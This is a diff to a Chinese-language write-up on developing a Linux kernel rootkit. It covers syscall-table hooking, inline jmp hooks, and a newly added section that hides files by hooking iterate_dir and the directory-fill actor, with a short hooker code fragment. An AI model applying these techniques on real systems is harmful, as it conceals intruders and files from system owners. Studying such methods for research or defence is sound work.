@@ -270,8 +270,9 @@ static size_t arbitrary_pte_write(void *dst, void *src, size_t size){
     return 0;
 }
 ```
-## hook
-### 系统表hook
+
+## 2.hook
+### 2.1.系统表hook
 首先找到系统调用表
 `arch/x86/include/generated/asm/syscalls_64.h`
 我们可以通过内核代码调用`call_usermodehelper()`这个内核函数来调用用户态的程序
@@ -332,7 +333,7 @@ static size_t arbitrary_pte_write(void *dst, void *src, size_t size){
 然后我们利用之前的任意写函数来改写该系统调用表的任意地址就可以达成hook
 
 
-### inline hook
+### 2.2.inline hook
 什么是inline hook, 实际上就是修改目标hook点的汇编代码，变成一串jmp <target addr>, 然后hook程序完毕后再恢复上下文的过程
 
 这里我个人实现的inline hook,大致原理如下:
@@ -458,7 +459,7 @@ static size_t hook_king(void){
 ## 3.隐藏
 这是rootkit最具特色的功能，首先实现文件目录的隐藏
 
-### 文件夹隐藏
+### 3.1.文件夹隐藏(严重缺陷版本)
 #### 系统调用级别
 首先查看平常的`ls`会调用哪些系统函数,可以简单的使用strace查看
 ```sh
@@ -527,7 +528,71 @@ init              pwhrootkit.ko     tmp
 > [!IMPORTANT]
 > 存在问题1: 这里获取的仅仅是相对目录，因此有很多制裁手段,需要查看getdents64相关代码，例如`iterator_dir`
 > 存在问题2: 仅仅在getdents64的hook并不全面,需要找到更加广泛适用的方案
+> 存在问题3: 既然系统调用handle函数源码显示fd是rdi, dirent是rsi,为什么真到了这个函数却不一样
 
+### 3.2.文件的隐藏
+查看linux6.3.4的系统调用源码之前先需要解决上述的问题3
+那么需要查看系统调用的入口点`entry_SYSCALL_64`
+
+调试代码过程中发现其会将用户态传入参数保存到内核栈上，而系统调用 `getdents64`则从栈上获取用户参数
+所以我们希望隐藏文件则需要修改hook点/或参数的获取方法(不仅是简单的get rax)
+
+因此将目光放在系统调用处理函数过程中所调用到的内核函数
+
+```c
+SYSCALL_DEFINE3(getdents64, unsigned int, fd,
+		struct linux_dirent64 __user *, dirent, unsigned int, count)
+{
+	struct fd f;
+	struct getdents_callback64 buf = {
+		.ctx.actor = filldir64,
+		.count = count,
+		.current_dir = dirent
+	};
+	int error;
+
+	f = fdget_pos(fd);
+	if (!f.file)
+		return -EBADF;
+
+	error = iterate_dir(f.file, &buf.ctx);
+	if (error >= 0)
+		error = buf.error;
+	if (buf.prev_reclen) {
+		struct linux_dirent64 __user * lastdirent;
+		typeof(lastdirent->d_off) d_off = buf.ctx.pos;
+
+		lastdirent = (void __user *) buf.current_dir - buf.prev_reclen;
+		if (put_user(d_off, &lastdirent->d_off))
+			error = -EFAULT;
+		else
+			error = count - buf.count;
+	}
+	fdput_pos(f);
+	return error;
+}
+
+```
+
+传入的参数为 `struct file, struct dir_context` ,然而每个真正填充用户传入`struct linux_dirent64`的函数为`.ctx.actor`
+因此我们只需要获得这个函数，然后在hook这个函数即可实现我们想要的功能
+
+
+分析源代码得知,`iterate_dir()`这个函数是主要遍历的内容，所以我们可以首先一次性hook到这里，
+```c
+
+static void iterate_dir_before_hooker(struct pt_regs *regs){
+    struct dir_context *ctx = (struct dir_context *)regs->si;
+    struct hook_context *actor_hook_ctx = hook_ctx_init();
+    hookpoint_add(actor_hook_ctx, (size_t)ctx->actor, (size_t)&actor_before_hooker, (size_t)NULL, HOOK_ETERNAL);
+}
+
+```
+
+然后如上所示在这个一次性hook的地方再次hook到对应的`ctx.actor`函数(ps 因为这个函数可能有多种，比如 `fillder64, filldir` 等等)，
+然后进行自行的DIY工作即可达成任意文件隐藏
+
+![arbitrary_file_hide](./img/arbitrary_file_hide.png) 
 
 
 
